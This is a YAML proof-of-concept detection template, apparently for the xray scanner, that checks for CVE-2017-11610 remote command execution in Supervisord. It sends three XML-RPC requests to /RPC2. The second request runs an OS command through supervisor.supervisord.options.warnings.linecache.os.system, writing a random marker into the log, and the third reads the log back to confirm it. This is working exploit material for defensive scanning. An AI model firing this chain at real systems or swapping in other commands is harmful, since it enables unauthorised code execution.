name: poc-yaml-supervisord-cve-2017-11610
binding: 078ead51-ba5c-4f81-8d1b-4c8cbe3a2956
manual: true
detail:
    author: Loneyer
    links:
        - https://github.com/vulhub/vulhub/tree/master/supervisor/CVE-2017-11610
    vulnerability:
        level: high
transport: http
set:
    randomString: randomLowercase(10)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /RPC2
            body: |-
                <?xml version="1.0"?>
                      <methodCall>
                      <methodName>supervisor.supervisord.options.logfile.strip</methodName>
                      </methodCall>
            follow_redirects: false
        expression: response.status == 200 && response.body.bstartsWith(b"<?xml version=") && "<value><string>(?<file>.+?)<\\/string><\\/value>".bmatches(response.body)
        output:
            search: '"<value><string>(?<file>.+?)<\\/string><\\/value>".bsubmatch(response.body)'
            file: search["file"]
    r1:
        request:
            cache: true
            method: POST
            path: /RPC2
            body: |-
                <?xml version="1.0"?>
                      <methodCall>
                      <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
                      <params>
                      <param>
                      <string>echo {{randomString}} >> {{file}}</string>
                      </param>
                      </params>
                      </methodCall>
            follow_redirects: false
        expression: response.status == 200 && response.body.bstartsWith(b"<?xml version=") && response.body.bcontains(b"<value><int>0</int></value>")
    r2:
        request:
            cache: true
            method: POST
            path: /RPC2
            body: |-
                <?xml version="1.0"?>
                      <methodCall>
                      <methodName>supervisor.readLog</methodName>
                      <params>
                      <param>
                      <int>-200</int>
                      </param>
                      <param>
                      <int>0</int>
                      </param>
                      </params>
                      </methodCall>
            follow_redirects: false
        expression: response.status == 200 && response.body.bstartsWith(b"<?xml version=") && response.body.bcontains(bytes(randomString))
expression: r0() && r1() && r2()
